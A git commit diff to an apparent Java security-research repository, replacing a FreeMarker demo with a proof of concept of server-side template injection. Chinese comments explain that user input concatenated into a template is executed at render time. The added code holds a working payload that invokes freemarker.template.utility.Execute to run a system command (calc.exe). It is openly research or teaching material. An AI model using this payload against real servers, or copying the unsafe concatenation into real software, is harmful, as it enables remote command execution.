49dfcd91d136db5a79c7798e8c261b84655131c3
SugarP1g <zhuchenhui1990@163.com>
2020-08-29 16:42:41 +0800

    Update POC.java

--- src/JavaSecurity/src/main/java/com/SugarP1g/ssti/FreeMarker/POC.java
+++ src/JavaSecurity/src/main/java/com/SugarP1g/ssti/FreeMarker/POC.java
@@ -4,7 +4,6 @@ import java.io.*;
 import java.util.HashMap;
 import java.util.Map;
 
-import freemarker.template.Configuration;
 import freemarker.template.Template;
 import freemarker.template.TemplateException;
 
@@ -12,22 +11,22 @@ import freemarker.template.TemplateException;
 public class POC {
 
     public static void main(String[] args) {
-        String resourcePath = "src/main/resources";
-        System.out.println("[+] Resource path: " + resourcePath);
-        Configuration config = new Configuration(Configuration.VERSION_2_3_30);
         Writer out = null;
 
         try {
-            config.setDirectoryForTemplateLoading(new File(resourcePath));
             Map<String, Object> dataMap = new HashMap<String, Object>();
-            dataMap.put("classPath", "com.freemarker.hello");
-            dataMap.put("className", "${2*2}");
-            dataMap.put("helloWorld", "Hello, this is a freemarker demo.");
-
-            Template template = config.getTemplate("hello.ftl");
-            File docFile = new File("./FreeMarkerDemo.java");
-            out = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(docFile)));
-
+            // 模拟外部可控的输入
+            String name = "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"calc.exe\")}";
+            // 外部可控的输入被拼接到模板中，导致模板被污染
+            String templateStr = "<!DOCTYPE html><html><body>" +
+                    "<form action='/' method='post'>" +
+                    "First name:<br/>" +
+                    "<input type='text' name='name' value=''>" +
+                    "<input type='submit' name='name' value='submit'>" +
+                    "</form><h2>Hello " + name + "</h2></body></html>";
+            Template template = new Template("test", new StringReader(templateStr), null);
+            out = new StringWriter();
+            // 渲染过程中，模板中插入的表达式被执行
             template.process(dataMap, out);
             System.out.println("[+] Template Rendering is success.");
         } catch (IOException e) {
